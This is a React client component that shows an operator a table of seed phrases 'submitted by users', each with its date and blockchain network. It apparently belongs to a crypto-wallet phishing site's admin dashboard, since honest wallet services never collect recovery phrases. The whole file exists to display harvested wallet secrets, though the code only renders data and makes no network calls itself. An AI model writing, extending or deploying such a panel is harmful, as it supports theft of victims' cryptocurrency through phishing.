
'use client';

import type { SeedPhraseRecord } from '@/app/actions';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { FileKey, AlertTriangle } from 'lucide-react';
import { format } from 'date-fns';

type SeedPhrasesViewerProps = {
  initialSeedPhrases: SeedPhraseRecord[] | null;
  error: string | null;
};

export function SeedPhrasesViewer({ initialSeedPhrases, error }: SeedPhrasesViewerProps) {
  if (error) {
    return (
      <Card className="w-full bg-card/50 border-destructive/50">
        <CardHeader>
          <CardTitle className="flex items-center gap-2 text-destructive">
            <AlertTriangle className="h-7 w-7" />
            Error Loading Data
          </CardTitle>
          <CardDescription>
            There was an error fetching the seed phrases.
          </CardDescription>
        </CardHeader>
        <CardContent>
          <p className="text-destructive">{error}</p>
        </CardContent>
      </Card>
    );
  }

  return (
    <Card className="w-full bg-card/50 border-primary/20">
      <CardHeader>
        <CardTitle className="flex items-center gap-2 text-2xl">
          <FileKey className="h-7 w-7 text-primary" />
          Submitted Seed Phrases
        </CardTitle>
        <CardDescription>
          Here are the phrases submitted by users, ordered by most recent.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <div className="border rounded-lg border-primary/20">
          <Table>
            <TableHeader>
              <TableRow className="border-primary/20">
                <TableHead className="w-1/4">Date Submitted</TableHead>
                <TableHead className="w-1/4">Network</TableHead>
                <TableHead>Seed Phrase</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {initialSeedPhrases && initialSeedPhrases.length > 0 ? (
                initialSeedPhrases.map((phrase) => (
                  <TableRow key={phrase.id} className="border-primary/10">
                    <TableCell>
                      {format(new Date(phrase.created_at), "PPP p")}
                    </TableCell>
                    <TableCell>{phrase.network}</TableCell>
                    <TableCell className="font-mono text-sm">{phrase.seed_phrase}</TableCell>
                  </TableRow>
                ))
              ) : (
                <TableRow>
                  <TableCell colSpan={3} className="text-center text-muted-foreground h-24">
                    No seed phrases have been submitted yet.
                  </TableCell>
                </TableRow>
              )}
            </TableBody>
          </Table>
        </div>
      </CardContent>
    </Card>
  );
}
